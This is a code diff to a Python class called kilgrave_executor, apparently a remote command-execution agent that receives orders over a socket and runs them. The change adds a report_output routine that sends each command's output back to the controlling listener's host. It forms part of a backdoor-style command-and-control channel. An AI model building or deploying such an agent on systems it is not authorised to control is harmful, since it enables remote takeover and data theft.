@@ -40,9 +40,14 @@ class kilgrave_executor():
   def shutdown(self):
     self.server_socket.close()
 
-  def report_output(self, order_output):
-    # TODO(@akmodi): Implement report_output
+  def report_output(self, order_output, listener_address):
     print(order_output)
+    collector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    collector.connect((listener_address[0], collector_port))
+    order_response = length_padder(len(order_output)) + order_output
+    collector.sendall(order_response)
+    collector.close()
+    print('report sent')
 
 def main():
   global executor_server
@@ -51,7 +56,7 @@ def main():
     order, listener_address = executor_server.wait_for_order()
     print(order)
     order_output = executor_server.execute_order(order)
-    executor_server.report_output(order_output)
+    executor_server.report_output(order_output, listener_address)
 
 if __name__ == "__main__":
   try:
